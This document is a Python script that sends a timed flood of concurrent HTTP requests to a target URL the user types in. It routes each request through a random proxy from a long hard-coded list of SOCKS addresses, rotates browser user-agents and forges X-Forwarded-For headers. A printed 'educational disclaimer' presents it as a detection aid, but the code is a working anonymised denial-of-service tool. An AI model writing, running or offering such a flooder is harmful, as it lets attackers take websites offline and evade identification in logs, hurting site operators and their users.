import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
import random
import time
import sys

# Color coding for terminal output
RED = "\033[91m"
RESET = "\033[0m"

PROXIES = [
    "socks5://72.37.217.3:4145", "socks5://72.195.34.35:27360", "socks5://72.195.34.41:4145",
    "socks5://72.195.34.42:4145", "socks5://72.195.34.58:4145", "socks5://72.195.34.59:4145",
    "socks5://72.195.114.169:4145", "socks5://72.195.114.184:4145", "socks5://72.206.181.97:64943",
    "socks5://72.206.181.103:4145", "socks5://72.206.181.105:64935", "socks5://72.206.181.123:4145",
    "socks5://72.210.208.101:4145", "socks5://72.210.221.197:4145", "socks5://72.210.221.223:4145",
    "socks5://72.210.252.134:46164", "socks5://72.210.252.137:4145", "socks5://72.217.216.239:4145",
    "socks5://72.221.164.34:60671", "socks5://72.221.171.130:4145", "socks5://72.221.171.135:4145",
    "socks5://72.221.172.203:4145", "socks5://72.221.196.157:35904", "socks5://72.221.232.152:4145",
    "socks5://72.221.232.155:4145", "socks5://74.119.144.60:4145", "socks5://74.119.147.209:4145",
    "socks5://78.135.105.217:50504", "socks5://80.253.246.238:6618", "socks5://85.143.254.38:1080",
    "socks5://91.121.48.221:38711", "socks5://91.151.88.220:6618", "socks5://93.177.103.24:50471",
    "socks5://98.162.25.4:31654", "socks5://98.162.25.7:31653", "socks5://98.162.25.16:4145",
    "socks5://98.162.25.23:4145", "socks5://98.162.25.29:31679", "socks5://98.162.96.41:4145",
    "socks5://98.162.96.52:4145", "socks5://98.162.96.53:10663", "socks5://98.170.57.231:4145",
    "socks5://98.170.57.249:4145", "socks5://98.175.31.195:4145", "socks5://98.181.137.80:4145",
    "socks5://98.181.137.83:4145", "socks5://98.188.47.132:4145", "socks5://98.188.47.150:4145",
    "socks5://101.91.242.198:6688", "socks5://103.54.57.117:50460", "socks5://103.174.178.131:1020",
    "socks5://103.174.178.133:1020", "socks5://103.174.178.137:1020", "socks5://103.174.178.145:2005",
    "socks5://103.242.175.241:8899", "socks5://104.37.135.145:4145", "socks5://104.37.175.200:22292",
    "socks5://104.200.135.46:4145", "socks5://104.200.152.30:4145", "socks5://104.248.158.27:25100",
    "socks5://107.152.98.5:4145", "socks5://107.181.161.81:4145", "socks5://107.181.168.145:4145",
    "socks5://109.238.14.123:52663", "socks5://109.245.231.73:8192", "socks5://111.61.73.175:7302",
    "socks5://112.86.116.24:1080", "socks5://114.236.93.203:15800", "socks5://115.127.36.190:1088",
    "socks5://115.127.62.50:1088", "socks5://115.127.80.1:9090", "socks5://115.127.83.142:1088",
    "socks5://115.127.106.226:1088", "socks5://120.77.203.0:443", "socks5://120.224.234.71:7300",
    "socks5://123.182.233.70:7302", "socks5://125.66.165.154:7302", "socks5://125.141.133.49:5566",
    "socks5://125.141.133.98:5566", "socks5://125.141.139.110:5566", "socks5://125.141.139.112:5566",
    "socks5://125.141.139.198:5566", "socks5://125.227.225.157:3389", "socks5://134.122.21.142:33346",
    "socks5://137.184.228.194:40886", "socks5://138.201.139.252:12344", "socks5://139.59.7.217:36590",
    "socks5://139.59.225.188:12827", "socks5://141.94.104.205:48452", "socks5://142.54.226.214:4145",
    "socks5://142.54.228.193:4145", "socks5://142.54.229.249:4145", "socks5://142.54.231.38:4145",
    "socks5://142.54.232.6:4145", "socks5://142.54.235.9:4145", "socks5://142.54.236.97:4145",
    "socks5://142.54.237.34:4145", "socks5://142.54.239.1:4145", "socks5://144.91.78.34:20269",
    "socks5://144.91.95.238:58237", "socks5://149.202.75.85:36666", "socks5://152.228.212.223:29272",
    "socks5://157.230.1.108:14070", "socks5://162.144.74.156:3620", "socks5://162.253.68.97:4145",
    "socks5://163.172.131.178:16379", "socks5://163.172.132.238:16379", "socks5://163.172.161.35:16379",
    "socks5://165.227.104.122:48500", "socks5://167.71.241.136:33299", "socks5://167.71.250.32:43965",
    "socks5://167.172.159.43:39019", "socks5://167.235.155.77:47287", "socks5://173.212.237.43:43648",
    "socks5://173.236.187.104:40355", "socks5://173.249.2.58:5964", "socks5://174.64.199.79:4145",
    "socks5://174.64.199.82:4145", "socks5://174.77.111.196:4145", "socks5://174.77.111.197:4145",
    "socks5://174.138.62.182:43715", "socks5://176.9.238.173:47679", "socks5://176.74.192.44:24822",
    "socks5://176.74.197.163:36918", "socks5://178.33.162.89:58574", "socks5://178.49.22.23:1080",
    "socks5://178.128.167.129:1080", "socks5://181.214.39.51:5719", "socks5://181.214.39.72:5719",
    "socks5://181.214.39.73:5719", "socks5://184.170.245.148:4145", "socks5://184.170.248.5:4145",
    "socks5://184.170.249.65:4145", "socks5://184.178.172.3:4145", "socks5://184.178.172.11:4145",
    "socks5://184.178.172.13:15311", "socks5://184.178.172.14:4145", "socks5://184.178.172.17:4145",
    "socks5://184.178.172.23:4145", "socks5://184.178.172.26:4145", "socks5://184.181.217.194:4145",
    "socks5://184.181.217.201:4145", "socks5://184.181.217.206:4145", "socks5://184.181.217.210:4145",
    "socks5://184.181.217.213:4145", "socks5://184.181.217.220:4145", "socks5://185.6.9.176:8072",
    "socks5://185.14.47.52:16088", "socks5://185.61.38.140:1080", "socks5://185.86.5.162:8975",
    "socks5://185.87.121.5:8975", "socks5://185.112.224.151:1080", "socks5://185.244.208.193:37430",
    "socks5://185.244.208.195:23699", "socks5://188.40.158.211:1088", "socks5://188.93.213.242:1080",
    "socks5://188.164.199.199:36938", "socks5://192.99.244.173:15590", "socks5://192.111.129.145:16894",
    "socks5://192.111.130.2:4145", "socks5://192.111.130.5:17002", "socks5://192.111.134.10:4145",
    "socks5://192.111.135.17:18302", "socks5://192.111.135.18:18301", "socks5://192.111.137.34:18765",
    "socks5://192.111.137.35:4145", "socks5://192.111.138.29:4145", "socks5://192.111.139.162:4145",
    "socks5://192.111.139.163:19404", "socks5://192.111.139.165:4145", "socks5://192.252.209.155:14455",
    "socks5://192.252.211.197:14921", "socks5://192.252.214.20:15864", "socks5://192.252.215.5:16137",
    "socks5://192.252.216.81:4145", "socks5://192.252.220.92:17328", "socks5://193.216.224.108:8192",
    "socks5://194.87.69.136:8989", "socks5://194.233.78.142:42495", "socks5://195.154.43.198:39522",
    "socks5://198.8.84.3:4145", "socks5://198.8.94.170:4145", "socks5://198.8.94.174:39078",
    "socks5://199.58.184.97:4145", "socks5://199.58.185.9:4145", "socks5://199.102.104.70:4145",
    "socks5://199.102.105.242:4145", "socks5://199.102.106.94:4145", "socks5://199.102.107.145:4145",
    "socks5://199.116.114.11:4145", "socks5://199.229.254.129:4145", "socks5://204.93.169.232:60755",
    "socks5://205.185.114.78:5556", "socks5://205.185.116.159:5556", "socks5://205.185.120.241:5556",
    "socks5://205.185.123.62:2555", "socks5://205.185.125.140:5556", "socks5://205.185.126.51:5556",
    "socks5://208.102.51.6:58208", "socks5://209.141.58.213:5556", "socks5://209.159.153.21:46234",
    "socks5://212.33.248.45:1080", "socks5://217.182.6.206:26379", "socks5://218.4.192.62:7302",
    "socks5://218.78.65.202:6688", "socks5://221.134.152.75:7302", "socks5://222.71.131.131:1080",
    "socks4://208.102.51.6:58208", "socks4://24.249.199.4:4145", "socks4://72.195.34.58:4145",
    "socks4://98.170.57.231:4145", "socks4://184.181.217.210:4145", "socks4://184.178.172.14:4145",
    "socks4://72.195.114.169:4145", "socks4://72.195.34.42:4145", "socks4://184.181.217.206:4145",
    "socks4://184.178.172.17:4145", "socks4://184.181.217.213:4145", "socks4://184.181.217.201:4145",
    "socks4://184.181.217.194:4145", "socks4://184.181.217.220:4145", "socks4://72.195.34.41:4145",
    "socks4://198.8.94.170:4145", "socks4://184.178.172.26:4145", "socks4://184.185.2.12:4145",
    "socks4://98.181.137.83:4145", "socks4://68.1.210.163:4145", "socks4://184.178.172.13:15311"
]

FINGERPRINTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/149.0.7827.137 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:150.0) Gecko/20100101 Firefox/150.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:150.0) Gecko/150.0 Firefox/150.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 15900.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/149.0.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Vivaldi/7.0.0",
    "Mozilla/5.0 (X11; Linux i686; rv:149.0) Gecko/20100101 Firefox/149.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Android 13; Tablet; rv:150.0) Gecko/150.0 Firefox/150.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Opera/119.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 TwitterApp/10.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Whale/4.0.0",
    "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36 SamsungBrowser/26.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Arc/1.7.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 YandexBrowser/24.1.0"
]

async def send_request(url, session, target_path):
    proxy_url = random.choice(PROXIES)
    connector = ProxyConnector.from_url(proxy_url)
    selected_fingerprint = random.choice(FINGERPRINTS)
    headers = {
        "User-Agent": selected_fingerprint,
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(target_path, headers=headers, timeout=5) as response:
                print(f"{target_path.ljust(40)} [Status: {response.status}, Fingerprint: {selected_fingerprint[:50]}...]")
    except:
        pass

async def main():
    print(f"{RED}")
    print("        noqhy enuzna v1.0-dev")
    print("________________________________________________")
    print(f"{RESET}")
    print("Educational Disclaimer: This tool is for authorized educational purposes only.")
    print("I am not responsible for any misuse. This tool demonstrates log manipulation")
    print("to mask identity, allowing admins to improve their detection capabilities.\n")
    
    target_url = input("Target URL (e.g., http://noqhyenuzna.org): ")
    spoof_count = int(input("Fake Fingerprint spoof count: "))
    duration = int(input("Duration (s): "))
    
    print(f":: URL              : {target_url}")
    print(":: Threads          : " + str(spoof_count))
    
    tasks = []
    end_time = time.time() + duration
    
    while time.time() < end_time:
        if len(tasks) < spoof_count:
            tasks.append(asyncio.create_task(send_request(target_url, None, target_url)))
        
        tasks = [t for t in tasks if not t.done()]
        await asyncio.sleep(0.01)

if __name__ == "__main__":
    asyncio.run(main())
